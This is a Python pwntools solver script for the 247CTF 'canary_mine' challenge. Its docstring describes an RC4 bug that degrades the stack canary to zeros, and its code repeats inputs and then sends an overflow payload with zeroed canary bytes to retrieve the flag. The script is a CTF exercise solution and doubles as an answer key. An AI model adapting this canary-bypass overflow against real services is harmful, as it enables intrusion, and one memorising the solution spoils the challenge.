#!/usr/bin/env python3
"""
Solver for 247CTF 'canary_mine' (flag_canary) challenge.

Challenge: "Can you sneak the secret code past the canary hidden down the challenge mine?"

Vulnerability:
The RC4 implementation has two critical bugs:
1. The PRGA indices i,j reset to 0 on every RC4_encrypt call (should be persistent)
2. The XOR swap function zeros out S[i] when i == j (a == b bug)

After ~750-1200 iterations, these bugs cause the S array to degrade,
making S[1..16] all zeros. This means the RC4 keystream (canary) becomes all zeros.

Exploit:
1. Send 32 bytes repeatedly to advance RC4 state without overwriting canary
2. After enough iterations, canary degrades to 16 zero bytes
3. Send payload: 32 padding + 16 zeros (canary) + "247CTF:)" (secret code)
4. Both check_canary and check_flag pass, revealing the flag
"""

from pwn import *

def solve(host, port):
    context.log_level = 'warning'

    print(f"[*] Connecting to {host}:{port}")
    r = remote(host, port)
    r.recvuntil(b'> ')

    # Iterate until canary degrades to zeros (typically 750-1200 iterations)
    iterations = 1500

    print(f"[*] Degrading canary ({iterations} iterations)...")
    for i in range(iterations):
        r.send(b'A' * 32)  # Preserves canary at buffer[32-47]
        r.recvuntil(b'> ')
        if (i + 1) % 500 == 0:
            print(f"    {i + 1}/{iterations} complete")

    print("[*] Sending exploit payload...")
    # Payload: 32 padding + 16 zeros (degraded canary) + "247CTF:)" (secret code)
    payload = b'X' * 32 + b'\x00' * 16 + b'247CTF:)'
    r.send(payload)

    response = r.recvall(timeout=5)
    r.close()

    # Extract flag
    if b'247CTF{' in response:
        flag = response[response.find(b'247CTF{'):].split(b'}')[0] + b'}'
        print(f"[+] Flag: {flag.decode()}")
        return flag.decode()
    else:
        print(f"[-] No flag found in response: {response}")
        return None

if __name__ == '__main__':
    import sys
    if len(sys.argv) == 3:
        host, port = sys.argv[1], int(sys.argv[2])
    else:
        host = 'ce3c9cc3e9d82540.247ctf.com'
        port = 50175

    solve(host, port)
